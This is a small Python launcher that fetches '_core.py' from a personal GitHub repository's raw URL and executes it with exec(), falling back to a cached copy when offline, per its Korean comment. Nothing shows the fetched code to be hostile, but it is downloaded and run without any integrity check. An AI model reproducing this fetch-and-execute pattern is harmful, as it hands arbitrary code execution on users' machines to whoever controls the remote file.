import urllib.request, pathlib, sys, os

BASE   = pathlib.Path(__file__).parent
GITHUB = "https://raw.githubusercontent.com/jiyeonhan011-cell/000/main/web"
CORE   = BASE / "_core.py"

try:
    urllib.request.urlretrieve(f"{GITHUB}/_core.py", CORE)
except Exception:
    pass  # 오프라인이면 캐시된 버전 사용

os.chdir(str(BASE))
exec(open(CORE, encoding="utf-8").read(), {"__file__": str(CORE)})
